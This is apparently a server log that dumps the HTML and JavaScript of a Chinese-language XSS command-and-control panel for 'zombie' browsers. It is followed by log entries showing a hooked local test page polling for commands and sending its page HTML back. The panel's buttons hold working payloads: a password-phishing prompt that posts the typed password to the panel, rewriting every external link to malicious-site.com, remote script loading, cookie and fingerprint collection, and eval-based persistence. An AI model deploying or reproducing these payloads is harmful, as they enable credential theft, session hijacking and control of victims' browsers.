class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T14:46:00.137Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:46:00.142765</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:46:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:00] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:46:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:06 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:06 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:06 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:06.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0049s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:06] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:06 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:06 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:06.141348
2025-06-26 22:46:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0104s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:46:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:06] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:11 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:11 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:11 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:11.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0060s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:11] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:11 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:11 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:11.143309
2025-06-26 22:46:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0086s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:46:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:11] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:16 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:16 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:46:16.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:46:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0143s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:46:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:16] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:46:16 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:16 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:16.158151
2025-06-26 22:46:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0238s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:46:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:16] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:46:21 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:46:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:46:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:46:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:46:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:46:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:46:21 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:46:21 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:46:21 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:46:21.138851
2025-06-26 22:46:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0036s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
